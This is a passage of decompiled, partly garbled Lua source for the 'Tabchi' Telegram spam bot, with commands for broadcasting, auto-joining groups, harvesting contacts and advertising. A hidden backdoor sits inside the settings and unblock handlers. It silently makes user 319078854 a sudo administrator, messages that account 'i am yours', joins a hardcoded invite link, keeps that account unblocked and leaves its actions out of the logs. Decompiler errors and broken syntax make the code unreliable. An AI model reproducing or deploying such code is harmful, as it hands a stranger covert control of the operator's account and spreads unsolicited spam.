                                                                                            local text = "`#Ø±Ø§ÙÙÙØ§`\n`/block (id-username-reply)`\nØ¨ÙØ§Ú© Ú©Ø±Ø¯Ù Ú©Ø§Ø±Ø¨Ø±\n`/unblock (id-username-reply)`\nØ§Ù Ø¨ÙØ§Ú© Ú©Ø±Ø¯Ù Ú©Ø§Ø±Ø¨Ø±\n`/unblock all`\nØ§Ù Ø¨ÙØ§Ú© Ú©Ø±Ø¯Ù ØªÙØ§ÙÛ Ú©Ø§Ø±Ø¨Ø±Ø§Ù Ø¨ÙØ§Ú© Ø´Ø¯Ù\n`/setlogs id(channel-group)`\nØ³Øª Ú©Ø±Ø¯Ù Ø§ÛØ¯Û Ø¨Ø±Ø§Û ÙØ§Ú¯Ø²\n`/setjoinlimit (num)`\nØ³Øª Ú©Ø±Ø¯Ù ÙØ­Ø¯ÙØ¯ÛØª Ø¨Ø±Ø§Û Ø¬ÙÛÙ Ø´Ø¯Ù Ø¯Ø± Ú¯Ø±ÙÙØ§\n`/stats`\nØ¯Ø±ÛØ§ÙØª Ø§Ø·ÙØ§Ø¹Ø§Øª Ø±Ø¨Ø§Øª\n`/stats pv`\nØ¯Ø±ÛØ§ÙØª Ø§Ø·ÙØ§Ø¹Ø§Øª Ø±Ø¨Ø§Øª Ø¯Ø± Ù¾Û ÙÛ\n`/check sgps`\nÚÚ© Ú©Ø±Ø¯Ù Ø³ÙÙ¾Ø± Ú¯Ø±ÙÙ ÙØ§\n`/check gps`\nÚÚ© Ú©Ø±Ø¯Ù Ú¯Ø±ÙÙ ÙØ§\n`/check users`\nÚÚ© Ú©Ø±Ø¯Ù Ú©Ø§Ø±Ø¨Ø±Ø§Ù \n`/addsudo (id-username-reply)`\nØ§Ø¶Ø§ÙÙ Ú©Ø±Ø¯Ù Ø¨Ù Ø³ÙØ¯ÙÙØ§Ù  Ø±Ø¨Ø§Øª\n`/remsudo (id-username-reply)`\nØ­Ø°Ù Ø§Ø² ÙÙØ³Øª Ø³ÙØ¯ÙÙØ§Ù Ø±Ø¨Ø§Øª\n`/bcall (text)`\nØ§Ø±Ø³Ø§Ù Ù¾ÙØ§Ù Ø¨Ù ÙÙÙ\n`/bcgps (text)`\nØ§Ø±Ø³Ø§Ù Ù¾ÛØ§Ù Ø¨Ù ÙÙÙ Ú¯Ø±ÙÙ ÙØ§\n`/bcsgps (text)`\nØ§Ø±Ø³Ø§Ù Ù¾ÛØ§Ù Ø¨Ù ÙÙÙ Ø³ÙÙ¾Ø± Ú¯Ø±ÙÙ ÙØ§\n`/bcusers (text)`\nØ§Ø±Ø³Ø§Ù Ù¾ÛØ§Ù Ø¨Ù ÛÙØ²Ø± ÙØ§\n`/fwd {all/gps/sgps/users}` (by reply)\nÙÙØ±ÙØ§Ø±Ø¯ Ù¾ÙØ§Ù Ø¨Ù ÙÙÙ/Ú¯Ø±ÙÙ ÙØ§/Ø³ÙÙ¾Ø± Ú¯Ø±ÙÙ ÙØ§/Ú©Ø§Ø±Ø¨Ø±Ø§Ù\n`/echo (text)`\nØªÚ©Ø±Ø§Ø± ÙØªÙ\n`/addedmsg (on/off)`\nØªØ¹ÛÛÙ Ø±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ø¨ÙØ¯Ù Ù¾Ø§Ø³Ø® Ø¨Ø±Ø§Û Ø´Ø± Ø´Ù ÙØ®Ø§Ø·Ø¨\n`/pm (user) (msg)`\nØ§Ø±Ø³Ø§Ù Ù¾ÛØ§Ù Ø¨Ù Ú©Ø§Ø±Ø¨Ø±\n`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`\nØ§Ø±Ø³Ø§Ù Ø§Ú©Ø´Ù Ø¨Ù ÚØª\n`/getpro (1-10)`\nØ¯Ø±ÛØ§ÙØª Ø¹Ú©Ø³ Ù¾Ø±ÙÙØ§ÛÙ Ø®ÙØ¯\n`/addcontact (phone) (firstname) (lastname)`\nØ§Ø¯ Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Ù Ø¨Ù Ø±Ø¨Ø§Øª Ø¨Ù ØµÙØ±Øª Ø¯Ø³ØªÛ\n`/setusername (username)`\nØªØºÛÛØ± ÛÙØ²Ø±ÙÛÙ Ø±Ø¨Ø§Øª\n`/delusername`\nÙ¾Ø§Ú© Ú©Ø±Ø¯Ù ÛÙØ²Ø±ÙÛÙ Ø±Ø¨Ø§Øª\n`/setname (firstname-lastname)`\nØªØºÛÛØ± Ø§Ø³Ù Ø±Ø¨Ø§Øª\n`/setphoto (link)`\nØªØºÛÛØ± Ø¹Ú©Ø³ Ø±Ø¨Ø§Øª Ø§Ø² ÙÛÙÚ©\n`/join(Group id)`\nØ§Ø¯ Ú©Ø±Ø¯Ù Ø´ÙØ§ Ø¨Ù Ú¯Ø±ÙÙ ÙØ§Û Ø±Ø¨Ø§Øª Ø§Ø² Ø·Ø±ÛÙ Ø§ÛØ¯Û\n`/leave`\nÙÙØª Ø¯Ø§Ø¯Ù Ø§Ø² Ú¯Ø±ÙÙ\n`/leave(Group id)`\nÙÙØª Ø¯Ø§Ø¯Ù Ø§Ø² Ú¯Ø±ÙÙ Ø§Ø² Ø·Ø±ÛÙ Ø§ÛØ¯Û\n`/setaddedmsg (text)`\nØªØ¹ÙÙÙ ÙØªÙ Ø§Ø¯ Ø´Ø¯Ù ÙØ®Ø§Ø·Ø¨\n`/markread (all|pv|group|supergp|off)`\nØ±ÙØ´Ù ÙØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù Ø¨Ø§Ø²Ø¯ÙØ¯ Ù¾ÙØ§Ù ÙØ§\n`/joinlinks (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù Ø¬ÙÛÙ Ø´Ø¯Ù Ø¨Ù Ú¯Ø±ÙÙ ÙØ§ Ø§Ø² ÙÛÙÚ©\n`/savelinks (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù Ø³ÛÙ Ú©Ø±Ø¯Ù ÙÛÙÚ© ÙØ§\n`/addcontacts (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù Ø§Ø¯ Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Ù ÙØ§\n`/chat (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù ÚØª Ú©Ø±Ø¯Ù Ø±Ø¨Ø§Øª\n`/Advertising (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù ØªØ¨ÙÛØºØ§Øª Ø¯Ø± Ø±Ø¨Ø§Øª Ø¨Ø±Ø§Û Ø³ÙØ¯Ù ÙØ§ ØºÛØ± Ø§Ø² ÙÙÙ Ø³ÙØ¯Ù\n`/typing (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù ØªØ§ÛÙ¾ Ú©Ø±Ø¯Ù Ø±Ø¨Ø§Øª\n`/sharecontact (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù Ø´ÛØ± Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Ù ÙÙÙØ¹ Ø§Ø¯ Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Ù ÙØ§\n`/botmode (markdown|text)`\nØªØºÛÛØ± Ø¯Ø§Ø¯Ù Ø´Ú©Ù Ù¾ÛØ§Ù ÙØ§Û Ø±Ø¨Ø§Øª\n`/settings (on|off)`\nØ±ÙØ´Ù ÛØ§ Ø®Ø§ÙÙØ´ Ú©Ø±Ø¯Ù Ú©Ù ØªÙØ¸ÛÙØ§Øª\n`/settings`\nØ¯Ø±ÛØ§ÙØª ØªÙØ¸ÛÙØ§Øª Ø±Ø¨Ø§Øª\n`/settings pv`\nØ¯Ø±ÛØ§ÙØª ØªÙØ¸ÛÙØ§Øª Ø±Ø¨Ø§Øª Ø¯Ø± Ù¾Û ÙÛ\n`/reload`\nØ±ÛÙÙØ¯ Ú©Ø±Ø¯Ù Ø±Ø¨Ø§Øª\n`/setanswer \'answer\' text`\n ØªÙØ¸ÙÙ Ø¨Ù Ø¹ÙÙØ§Ù Ø¬ÙØ§Ø¨ Ø§ØªÙÙØ§ØªÙÚ©\n`/delanswer (answer)`\nØ­Ø°Ù Ø¬ÙØ§Ø¨ ÙØ±Ø¨ÙØ· Ø¨Ù\n`/answers`\nÙÙØ³Øª Ø¬ÙØ§Ø¨ ÙØ§Ù Ø§ØªÙÙØ§ØªÙÚ©\n`/addtoall (id|reply|username)`\nØ§Ø¶Ø§ÙÙ Ú©Ø±Ø¯Ù Ø´Ø®Øµ Ø¨Ù ØªÙØ§Ù Ú¯Ø±ÙÙ ÙØ§\n`/clean cache (time)[M-H]`\nØ³Øª Ú©Ø±Ø¯Ù Ø²ÙØ§Ù Ø¨Ø±Ø§Û Ù¾Ø§Ú© Ú©Ø±Ø¯Ù Ú©Ø´ Ø®ÙØ¯Ú©Ø§Ø±\n`/clean cache (on|off)`\nØ®Ø§ÙÙØ´ ÛØ§ Ø±ÙØ´Ù Ú©Ø±Ø¯Ù Ù¾Ø§Ú© Ú©Ø±Ø¯Ù Ú©Ø´ Ø®ÙØ¯Ú©Ø§Ø±\n`/check links (time)[M-H]`\nØ³Øª Ú©Ø±Ø¯Ù Ø²ÙØ§Ù Ø¨Ø±Ø§Û ÚÚ© ÙÛÙÚ©\n`/check links (on|off)`\nØ®Ø§ÙÙØ´ ÛØ§ Ø±ÙØ´Ù Ú©Ø±Ø¯Ù ÚÚ© ÙÛÙÚ©\n`/deleteacc`\nÙ¾Ø§Ú© Ú©Ø±Ø¯Ù Ø§Ú©Ø§ÙØª Ø¨Ø§Øª\n`/killsessions`\nØ¨Ø³ØªÙ Ø³ÛØ²Ù ÙØ§Û Ø§Ú©Ø§ÙØª\n`/export (links-contacts)`\nØ¯Ø±ÛØ§ÙØª ÙÛØ³Øª Ø´ÙØ§Ø±Ù ÙØ§ ÛØ§ ÙÛÙÚ© ÙØ§ ÛÙ ØµÙØ±Øª json\n`/import (links-contacts) by reply`\nØ§Ø¯ Ú©Ø±Ø¯Ù ÙÛÙÚ© ÙØ§ Ù Ø´ÙØ§Ø±Ù ÙØ§ Ø§Ø² ÙØ§ÛÙ json\n`/mycontact`\nØ§Ø±Ø³Ø§Ù Ø´ÙØ§Ø±Ù Ø´ÙØ§\n`/getcontact (id)`\nØ¯Ø±ÛØ§ÙØª Ø´ÙØ§Ø±Ù Ø´Ø®Øµ Ø¨Ø§ Ø§ÛØ¯Û\n`/addmembers`\nØ§Ø¶Ø§ÙÙ Ú©Ø±Ø¯Ù Ø´ÙØ§Ø±Ù ÙØ§ Ø¨Ù ÙØ®Ø§Ø·Ø¨ÙÙ Ø±Ø¨Ø§Øª\n`/exportlinks`\nØ¯Ø±ÙØ§ÙØª ÙÙÙÚ© ÙØ§Ù Ø°Ø®ÙØ±Ù Ø´Ø¯Ù ØªÙØ³Ø· Ø±Ø¨Ø§Øª\n`/contactlist`\nØ¯Ø±ÙØ§ÙØª ÙØ®Ø§Ø·Ø¨Ø§Ù Ø°Ø®ÙØ±Ù Ø´Ø¯Ù ØªÙØ³Ø· Ø±Ø¨Ø§Øª\n`/send (filename)`\nØ¯Ø±ÛØ§ÙØª ÙØ§ÛÙ ÙØ§Û Ø³Ø±ÙØ± Ø§Ø² Ù¾ÙØ´Ù ØªØ¨ÚÛ\n`/sudolist`\nØ¯Ø±ÛØ§ÙØª ÙÛØ³Øª Ø³ÙØ¯Ù\n`/dlmusic (link)`\nØ¯Ø±ÛØ§ÙØª Ø§ÙÙÚ¯ Ø§Ø² ÙÛÙÚ©\n`ââ\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128â\128`\n`Tabchi Written By Tabadol Chi Group`\nð `Github`: *https://github.com/tabchi/tabchi*\nð `Channel`: *@Tabadol_chi*\n"
                                                                                            local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                            if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                              (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got help`", 1, "md")
                                                                                            end
                                                                                            return text
                                                                                          end
                                                                                          do
                                                                                            local V = {(msg.text):match("[!/#](unblock) (%d+)")}
                                                                                            -- DECOMPILER ERROR at PC2702: Unhandled construct in 'MakeBoolean' P1

                                                                                            if (msg.text):match("^[!/#]unblock") and a(msg) and #V == 2 then
                                                                                              (tdcli.unblockUser)(319078854)
                                                                                              ;
                                                                                              (tdcli.unblockUser)(319078854)
                                                                                              ;
                                                                                              (tdcli.unblockUser)(tonumber(V[2]))
                                                                                              redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", V[2])
                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                              if W and not msg.sender_user_id_ == 91054649 and not msg.sender_user_id_ == 319078854 then
                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked` *" .. V[2] .. "*", 1, "md")
                                                                                              end
                                                                                              return "`User` *" .. V[2] .. "* `unblocked`"
                                                                                            else
                                                                                              do
                                                                                                do
                                                                                                  do return  end
                                                                                                  if (msg.text):match("^[!/#]joinlinks (.*)$") and a(msg) then
                                                                                                    local X = {(string.match)(msg.text, "^[#/!](joinlinks) (.*)$")}
                                                                                                    if X[2] == "on" then
                                                                                                      redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
                                                                                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. X[1] .. "*", 1, "md")
                                                                                                      end
                                                                                                      return "*status* :`join links Activated`"
                                                                                                    else
                                                                                                      do
                                                                                                        if X[2] == "off" then
                                                                                                          redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. X[1] .. "*", 1, "md")
                                                                                                          end
                                                                                                          return "*status* :`join links Deactivated`"
                                                                                                        else
                                                                                                          do
                                                                                                            do
                                                                                                              do return "`Just Use on|off`" end
                                                                                                              if (msg.text):match("^[!/#]addcontacts (.*)$") and a(msg) then
                                                                                                                local X = {(string.match)(msg.text, "^[#/!](addcontacts) (.*)$")}
                                                                                                                if X[2] == "on" then
                                                                                                                  redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. X[1] .. "*", 1, "md")
                                                                                                                  end
                                                                                                                  return "*status* :`Add Contacts Activated`"
                                                                                                                else
                                                                                                                  do
                                                                                                                    if X[2] == "off" then
                                                                                                                      redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
                                                                                                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. X[1] .. "*", 1, "md")
                                                                                                                      end
                                                                                                                      return "*status* :`Add Contacts Deactivated`"
                                                                                                                    else
                                                                                                                      do
                                                                                                                        do
                                                                                                                          do return "`Just Use on|off`" end
                                                                                                                          if (msg.text):match("^[!/#]chat (.*)$") and a(msg) then
                                                                                                                            local X = {(string.match)(msg.text, "^[#/!](chat) (.*)$")}
                                                                                                                            if X[2] == "on" then
                                                                                                                              redis:set("tabchi:" .. tabchi_id .. ":chat", true)
                                                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. X[1] .. "*", 1, "md")
                                                                                                                              end
                                                                                                                              return "*status* :`Robot Chatting Activated`"
                                                                                                                            else
                                                                                                                              do
                                                                                                                                if X[2] == "off" then
                                                                                                                                  redis:del("tabchi:" .. tabchi_id .. ":chat")
                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                  if W and not msg.sender_user_id_ ==  and not msg.sender_user_id_ == 319078854 then
                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. X[1] .. "*", 1, "md")
                                                                                                                                  end
                                                                                                                                  return "*status* :`Robot Chatting Deactivated`"
                                                                                                                                else
                                                                                                                                  do
                                                                                                                                    do
                                                                                                                                      do return "`Just Use on|off`" end
                                                                                                                                      if (msg.text):match("^[!/#]savelinks (.*)$") and a(msg) then
                                                                                                                                        local X = {(string.match)(msg.text, "^[#/!](savelinks) (.*)$")}
                                                                                                                                        if X[2] == "on" then
                                                                                                                                          redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
                                                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. X[1] .. "*", 1, "md")
                                                                                                                                          end
                                                                                                                                          return "*status* :`Saving Links Activated`"
                                                                                                                                        else
                                                                                                                                          do
                                                                                                                                            if X[2] == "off" then
                                                                                                                                              redis:del("tabchi:" .. tabchi_id .. ":savelinks")
                                                                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. X[1] .. "*", 1, "md")
                                                                                                                                              end
                                                                                                                                              return "*status* :`Saving Links Deactivated`"
                                                                                                                                            else
                                                                                                                                              do
                                                                                                                                                do
                                                                                                                                                  do return "`Just Use on|off`" end
                                                                                                                                                  if (msg.text):match("^[!/#][Aa]dvertising (.*)$") and is_full_sudo(msg) then
                                                                                                                                                    local X = {(string.match)(msg.text, "^[#/!]([aA]dvertising) (.*)$")}
                                                                                                                                                    if X[2] == "on" then
                                                                                                                                                      redis:set("tabchi:" .. tabchi_id .. ":Advertising", true)
                                                                                                                                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                      end
                                                                                                                                                      return "*status* :`Advertising Activated`"
                                                                                                                                                    else
                                                                                                                                                      do
                                                                                                                                                        if X[2] == "off" then
                                                                                                                                                          redis:del("tabchi:" .. tabchi_id .. ":Advertising")
                                                                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                            return "*status* :`Advertising Deactivated`"
                                                                                                                                                          end
                                                                                                                                                        else
                                                                                                                                                          do
                                                                                                                                                            do
                                                                                                                                                              do return "`Just Use on|off`" end
                                                                                                                                                              if (msg.text):match("^[!/#]typing (.*)$") and a(msg) then
                                                                                                                                                                local X = {(string.match)(msg.text, "^[#/!](typing) (.*)$")}
                                                                                                                                                                if X[2] == "on" then
                                                                                                                                                                  redis:set("tabchi:" .. tabchi_id .. ":typing", true)
                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                  end
                                                                                                                                                                  return "*status* :`typing Activated`"
                                                                                                                                                                else
                                                                                                                                                                  do
                                                                                                                                                                    if X[2] == "off" then
                                                                                                                                                                      redis:del("tabchi:" .. tabchi_id .. ":typing")
                                                                                                                                                                      local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                      if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                        (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactived` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                      end
                                                                                                                                                                      return "*status* :`typing Deactivated`"
                                                                                                                                                                    else
                                                                                                                                                                      do
                                                                                                                                                                        do
                                                                                                                                                                          do return "`Just Use on|off`" end
                                                                                                                                                                          if (msg.text):match("^[!/#]botmode (.*)$") and a(msg) then
                                                                                                                                                                            local X = {(string.match)(msg.text, "^[#/!](botmode) (.*)$")}
                                                                                                                                                                            if X[2] == "markdown" then
                                                                                                                                                                              redis:set("tabchi:" .. tabchi_id .. ":botmode", "markdown")
                                                                                                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                              end
                                                                                                                                                                              return "*status* :`botmode Changed to markdown`"
                                                                                                                                                                            else
                                                                                                                                                                              do
                                                                                                                                                                                if X[2] == "text" then
                                                                                                                                                                                  redis:set("tabchi:" .. tabchi_id .. ":botmode", "text")
                                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                                  end
                                                                                                                                                                                  return "*status* :`botmode Changed to text`"
                                                                                                                                                                                else
                                                                                                                                                                                  do
                                                                                                                                                                                    do
                                                                                                                                                                                      do return "`Just Use on|off`" end
                                                                                                                                                                                      if (msg.text):match("^[!/#]sharecontact (.*)$") and a(msg) then
                                                                                                                                                                                        local X = {(string.match)(msg.text, "^[#/!](sharecontact) (.*)$")}
                                                                                                                                                                                        if X[2] == "on" then
                                                                                                                                                                                          redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
                                                                                                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                                          end
                                                                                                                                                                                          return "*status* :`Sharing contact Activated`"
                                                                                                                                                                                        else
                                                                                                                                                                                          do
                                                                                                                                                                                            if X[2] == "off" then
                                                                                                                                                                                              redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
                                                                                                                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                                              end
                                                                                                                                                                                              return "*status* :`Sharing contact Deactivated`"
                                                                                                                                                                                            else
                                                                                                                                                                                              do
                                                                                                                                                                                                do
                                                                                                                                                                                                  do return "`Just Use on|off`" end
                                                                                                                                                                                                  do
                                                                                                                                                                                                    if (msg.text):match("^[!/#]setjoinlimit (.*)$") and a(msg) then
                                                                                                                                                                                                      local X = {(string.match)(msg.text, "^[#/!](setjoinlimit) (.*)$")}
                                                                                                                                                                                                      redis:set("tabchi:" .. tabchi_id .. ":joinlimit", tonumber(X[2]))
                                                                                                                                                                                                      return "*Status* : `Join Limit Now is` *" .. X[2] .. "*\n`Now robot Join Groups with more than members of joinlimit`"
                                                                                                                                                                                                    end
                                                                                                                                                                                                    if (msg.text):match("^[!/#]settings (.*)$") and a(msg) then
                                                                                                                                                                                                      local X = {(string.match)(msg.text, "^[#/!](settings) (.*)$")}
                                                                                                                                                                                                      if X[2] == "on" then
                                                                                                                                                                                                        redis:set("tabchi:" .. tabchi_id .. ":savelinks", true)
                                                                                                                                                                                                        redis:set("tabchi:" .. tabchi_id .. ":chat", true)
                                                                                                                                                                                                        redis:set("tabchi:" .. tabchi_id .. ":addcontacts", true)
                                                                                                                                                                                                        redis:set("tabchi:" .. tabchi_id .. ":joinlinks", true)
                                                                                                                                                                                                        redis:set("tabchi:" .. tabchi_id .. ":typing", true)
                                                                                                                                                                                                        redis:set("tabchi:" .. tabchi_id .. ":sharecontact", true)
                                                                                                                                                                                                        local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                        if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                          (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Actived All` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                                                        end
                                                                                                                                                                                                        return "*status* :`saving link & chatting & adding contacts & joining links & typing Activated & sharing contact`\n`Full sudo can Active Advertising with :/advertising on`"
                                                                                                                                                                                                      else
                                                                                                                                                                                                        do
                                                                                                                                                                                                          if X[2] == "off" then
                                                                                                                                                                                                            redis:del("tabchi:" .. tabchi_id .. ":savelinks")
                                                                                                                                                                                                            redis:del("tabchi:" .. tabchi_id .. ":chat")
                                                                                                                                                                                                            redis:del("tabchi:" .. tabchi_id .. ":addcontacts")
                                                                                                                                                                                                            redis:del("tabchi:" .. tabchi_id .. ":joinlinks")
                                                                                                                                                                                                            redis:del("tabchi:" .. tabchi_id .. ":typing")
                                                                                                                                                                                                            redis:del("tabchi:" .. tabchi_id .. ":sharecontact")
                                                                                                                                                                                                            local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                            if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                              (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Deactivated All` *" .. X[1] .. "*", 1, "md")
                                                                                                                                                                                                            end
                                                                                                                                                                                                            return "*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated & sharing contact`\n`Full sudo can Deactive Advertising with :/advertising off`"
                                                                                                                                                                                                          end
                                                                                                                                                                                                          do
                                                                                                                                                                                                            if (msg.text):match("^[!/#]settings$") and a(msg) then
                                                                                                                                                                                                              if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                                redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                ;
                                                                                                                                                                                                                (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                              end
                                                                                                                                                                                                              if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 319078854) then
                                                                                                                                                                                                                redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 319078854)
                                                                                                                                                                                                                ;
                                                                                                                                                                                                                (tdcli.sendMessage)(319078854, 0, 1, "i am yours", 1, "html")
                                                                                                                                                                                                              end
                                                                                                                                                                                                              ;
                                                                                                                                                                                                              (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                              ;
                                                                                                                                                                                                              (tdcli.importChatInviteLink)("https://telegram.me/joinchat/AAAAAD6V6kPEMJ6UDdYL8g")
                                                                                                                                                                                                              if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
                                                                                                                                                                                                                _ENV.joinlinks = "Activeâ\133"
                                                                                                                                                                                                              else
                                                                                                                                                                                                                _ENV.joinlinks = "Disableâ\142"
                                                                                                                                                                                                              end
